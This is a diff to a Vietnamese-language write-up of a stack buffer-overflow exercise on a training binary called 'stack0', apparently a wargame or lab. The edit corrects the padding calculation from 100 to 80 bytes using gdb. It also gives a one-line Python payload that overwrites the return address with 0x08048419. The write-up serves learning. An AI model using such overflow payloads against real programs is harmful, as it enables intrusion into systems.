@@ -19,6 +19,11 @@ t thấy chương trình dùng gets để nhập input vào `[esp+0x1c]`. Sau đ
 
 ### Ret2ret
 
-Ta có thể overflow sang EIP để jump về `0x08048419`.
-padding = esp + ebp = 0x60 + 4 = 0x64
-payload: `python -c 'print "a"*100 + "\x19\x84\x04\x08"' | ./stack0`
+Ta có thể overflow sang EIP để jump về `0x08048419`. Ban đầu mình tính padding = 64+4+4 = 72 nhưng ko exploit đc. Nên sau đó mình dùng Gdb để có đc địa chỉ của ESP,EBP.
+
+![ebp-esp](ebp-esp.png)
+
+`padding = [ebp]-[esp+0x1c] + ebp(4byte) = 80`
+payload: `python -c 'print "a"*80 + "\x19\x84\x04\x08"' | ./stack0`
+![ret2ret](ret2ret.png)
+
